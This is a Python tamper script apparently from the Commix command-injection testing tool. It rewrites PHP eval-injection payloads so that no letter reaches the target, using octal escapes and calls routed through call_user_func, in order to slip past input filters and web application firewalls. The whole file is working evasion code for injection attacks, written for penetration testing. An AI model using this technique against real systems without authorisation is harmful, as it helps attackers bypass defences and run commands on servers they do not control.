#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
from src.utils import settings
from src.core.controller import checks

r"""
About: Runs the command without a single a-z/A-Z character reaching the target, by octal-escaping every letter the payload needs and calling functions by a name built that way.
Notes: This tamper script works against target(s) rejecting any letter in the evaluated string before it is evaluated (i.e. option '--eval=php'), since PHP decodes a double-quoted or backtick string's own '\NNN' octal escapes only once that check has already passed. 'print' and 'eval' are language constructs rather than functions, so nothing dynamic can call them by name - the wrapper classic.py's payloads put around a result is rebuilt through 'printf' instead, but one of the probe's own boundaries calls 'eval' by that literal name and is not covered.
References: [1] https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/
"""

"""
Every call is hidden the same way: an array literal is built and indexed, '[$_1=name,$_1(args)][1]'.
The literal hides the name, reads as an expression so it sits wherever a value can, and answers with
the call's own return value at its second element.

An execution function is run only for what it does, so what the construct answers with would not
matter for those. It matters for 'rtrim'/'strlen'/'ord'/'substr'/'intval', which are read for what
they answer and feed a comparison or another call: a sequencing operator that answers only true or
false would silently replace "did this string have length 6" with "did the call succeed", which
reads the same on every length at once. One shape for both leaves no second answer to get wrong,
and leaves no operator in the payload beyond the separator it is proving.
"""

__tamper__ = "phpnoletters"
__priority__ = settings.PRIORITY.HIGH

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_command_incompatible(__tamper__) or checks.tamper_dep_grammar_only(__tamper__, "php")

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# Every ASCII letter as the octal escape a double-quoted (or backtick) string decodes back into it,
# leaving no letter of its own in the payload - a literal backslash is doubled so it still reads as
# one, and a literal '%' is hidden the same way since it reads as the start of a URL escape of its
# own once the payload is sent, letter or not.
def _hide_letters(text):
  hidden = []
  for char in text:
    if char == "\\":
      hidden.append("\\\\")
    elif char == "%" or (char.isalpha() and ord(char) < 128):
      hidden.append("\\%03o" % ord(char))
    else:
      hidden.append(char)
  return "".join(hidden)

"""
Calling a function by a name built the same way, so naming the function this reaches costs no
letter either. The assignment and the call are sequenced by an array literal, read back at its
second element - which reads as an expression, so this sits anywhere a value can, and carries no
'&&' of its own. A payload proves one separator; '&&' in a sink that chains on something else is
one more character for a filter to strip, and a filter strips characters, it does not read PHP.
"""
_CALL_USER_FUNC = "\"" + _hide_letters("call_user_func") + "\""

def _hidden_call(name, args):
  return ("[$_1=" + _CALL_USER_FUNC + ",$_1(\"" + _hide_letters(name) + "\"" +
          ("," if args else "") + args + ")][1]")

# The probe and the execution functions - run for what they do, never read for what they answer.
_EXEC_NAMES = list(settings.EXECUTION_FUNCTIONS_LVL3) + ["phpinfo", "sleep"]

# The real functions the other techniques' own helpers (trim/length/ordinal/to_number) are built
# from - read for what they answer, so hiding one has to answer with the same value it hid.
_VALUE_NAMES = ["rtrim", "strlen", "ord", "substr", "intval"]

# Each name's own pattern, compiled once rather than once per payload - none of the five changes
# for the life of the process.
_CALL_PATTERNS = {}

def _call_pattern(name):
  if name not in _CALL_PATTERNS:
    _CALL_PATTERNS[name] = re.compile(r"(?<![\w\\])" + re.escape(name) + r"\(")
  return _CALL_PATTERNS[name]

"""
The closing bracket that balances the one at 'open_index', a backtick-run command's own '(' and ')'
skipped rather than counted - those are shell syntax sitting in a string token, not PHP nesting.
"""
def _matching_paren(text, open_index):
  depth, in_backtick, i = 0, False, open_index
  while i < len(text):
    char = text[i]
    if char == "`":
      in_backtick = not in_backtick
    elif not in_backtick:
      if char == "(":
        depth += 1
      elif char == ")":
        depth -= 1
        if depth == 0:
          return i
    i += 1
  return -1

"""
Run one of the value-producing names above through the letter-free call, its answer read back out
of the array it was written into rather than thrown away the way '&&' would. The whole call - not
just where it opens - has to be found and replaced in one piece, since the array literal closes
around the end of it as much as the name is hidden at the start.
"""
def _hide_value_calls(payload, name):
  pattern = _call_pattern(name)
  pieces, pos = [], 0
  while True:
    match = pattern.search(payload, pos)
    if not match:
      pieces.append(payload[pos:])
      break
    open_paren = match.end() - 1
    close_paren = _matching_paren(payload, open_paren)
    if close_paren == -1:
      pieces.append(payload[pos:])
      break
    pieces.append(payload[pos:match.start()])
    args = payload[open_paren + 1:close_paren]
    pieces.append(_hidden_call(name, args))
    pos = close_paren + 1
  return "".join(pieces)

# 'print(...)' is classic.py's own wrapper, not something the target ever chose - rebuilt through
# 'printf' since 'print' cannot be reached by name the way a real function can, wherever in the
# boundary-wrapped payload it sits. A stray trailing ';' left behind it is a harmless empty statement,
# and the one true statement a bare, unwrapped sink needs its payload to end on.
def _hide_print(payload):
  start = payload.find("print(")
  if start == -1 or (start > 0 and (payload[start - 1].isalnum() or payload[start - 1] in "_\\")):
    return payload
  open_paren = start + len("print")
  close_paren = _matching_paren(payload, open_paren)
  if close_paren == -1:
    return payload
  inner = payload[open_paren + 1:close_paren]
  replacement = _hidden_call("printf", "\"" + _hide_letters("%s") + "\"," + inner) + ";"
  return payload[:start] + replacement + payload[close_paren + 1:]

"""
halt()'s 'exit()' is a language construct, not a function - nothing dynamic can call it, and a
fatal error in its place (trigger_error() at E_USER_ERROR, say) answers with an HTTP 500 rather
than stopping output where 'exit()' would have - and commix's own request layer reads a 500 as the
request having failed outright, never handing the boolean-based oracle a page to compare at all,
true or false alike. The ternary this sits in already answers "" for true, so answering any
different, fixed, letter-free value for false - no call, no halt, ordinary 200 either way - is a
value the oracle can compare exactly the way it compares everything else it is asked about.
"""
_HALT_REPLACEMENT = "9256"

# Hide every letter left inside a backtick-run shell command, the punctuation around it untouched.
def _hide_backtick(match):
  return "`" + _hide_letters(match.group(1)) + "`"

def tamper(payload):
  # Run for what they do or read for what they answer, every one is hidden the same way.
  for name in _EXEC_NAMES + _VALUE_NAMES:
    payload = _hide_value_calls(payload, name)
  payload = payload.replace("exit()", _HALT_REPLACEMENT)
  payload = _hide_print(payload)
  return re.sub(r"`([^`]*)`", _hide_backtick, payload)

# eof
